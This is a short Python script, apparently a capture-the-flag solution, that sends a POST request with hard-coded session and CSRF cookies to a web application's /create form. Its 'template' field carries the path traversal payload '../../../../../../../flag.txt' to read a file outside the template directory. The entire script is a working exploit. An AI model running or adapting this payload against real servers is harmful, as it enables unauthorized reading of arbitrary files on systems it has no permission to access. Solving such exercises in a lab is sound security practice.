import requests

cookies = {
    'csrftoken': '3giEBOlCuitRpuI5B94ESZ2mUJsHSvNt',
    'sessionid': 'c7mxiwlau6ltxtt8kzz0k0y6tcbzslc3',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'csrftoken=3giEBOlCuitRpuI5B94ESZ2mUJsHSvNt; sessionid=c7mxiwlau6ltxtt8kzz0k0y6tcbzslc3',
    'Origin': 'https://web.kazet.cc:42448',
    'Referer': 'https://web.kazet.cc:42448/create',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data = {
    'csrfmiddlewaretoken': '9aosPCE1rU0Bzub3LMmaXttts8ygwF892gwWggPtL2jiOOJYcLgEFilFcHQNe0Ls',
    'recipient': 'ziomek1',
    'content': '<p>123</p>',     
    'template': '../../../../../../../flag.txt',
}

response = requests.post('https://web.kazet.cc:42448/create', cookies=cookies, headers=headers, data=data)
print(response.content)

